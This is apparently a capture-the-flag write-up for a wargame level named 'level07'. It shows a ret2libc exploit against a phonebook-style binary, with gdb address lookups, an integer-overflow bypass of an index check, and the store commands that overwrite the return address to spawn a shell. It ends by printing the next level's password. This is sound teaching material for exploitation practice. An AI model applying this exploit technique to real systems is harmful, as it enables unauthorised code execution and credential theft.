level07
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

*	We have the [level07](src/level07) executable and here is the [code](src/level07.c)
*	Code is pretty long but here are the bascis:
	- infinite loop that asks for commands
	- `store`, `read` and `quit`
	- `store` asks for a `number` to store on which `index`
	- `read` asks for for which `index` you want to see
	- `quit` leaves the loop
	- `number` cant be a multiple of `3`
*	Classic phonebook like program.
*	This time we should be able to exploit the memory and the code. at first glance it doesn't seem to have any weakness but the bigest one we find is that the `index` we provide is NOT bound checked
*	This isn't a printf exploit but th program will still only deals with decimals
*	We should be able to `Ret2libc` this one so let's retrieve what we always need:
	```gdb 
	(gdb) p system
	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
	(gdb) p exit
	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
	(gdb) find &system, +9999999, "/bin/sh"
	0xf7f897ec
	```
	no plt here so nothing special to do except decimal version
	```console
	system: 0xf7e6aed0 -> 4159090384
	exit: 0xf7e5eb70 -> 4159040368
	/bin/sh: 0xf7f897ec -> 4160264172
	```
*	This is where it gets tricky, we need to find the right index to place our exploit. We want to see where the index gets weird and if we can find the `main` return address.
	```gdb
	(gdb) info frame
	Stack level 0, frame at 0xffffd300:
	eip = 0x8048729 in main; saved eip -->0xf7e45513<--
	```
	f7e45513(HEX) -> 4158936339(DEC)
*	We know the `index` is an array of `100` so let's try to read above that
	```console
	Input command: read
	Index: 114
	Number at data[114] is 4158936339
	Completed read command successfully
	```
	I did it manually because I was pretty sure it was close to 100 but next time I'll do a little program for sure !
*	So we got `114`, unfortunately this number is a multiple of `3`
	```console
	Input command: store
	Number: 1
	Index: 114
	*** ERROR! ***
	This index is reserved for wil!
	*** ERROR! ***
	Failed to do store command
	```
	BUT, at our level we should be away that most number checking function can be bypass via underflow/overflow depending on the programs protection. We have to take the `MAX_UINT / 4` since the programs multiply it by `4` and add `144`. All of this gives us the value `1073741938`
*	Let's try to do this one now that we have everything we need:
	```console
	Input command: store
	Number: 4159090384
	Index: 1073741938
	Completed store command successfully
	Input command: read
	Index: 114
	Number at data[114] is 4159090384
	Completed read command successfully
	```
	Nice it works so let's end it
	```console
	Input command: store
	Number: 4159040368
	Index: 115
	Completed store command successfully
	Input command: store
	Number: 4160264172
	Index: 116
	Completed store command successfully
	Input command: quit
	$ whoami
	level08
	$ cd ../level08
	$ cat .pass
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
	```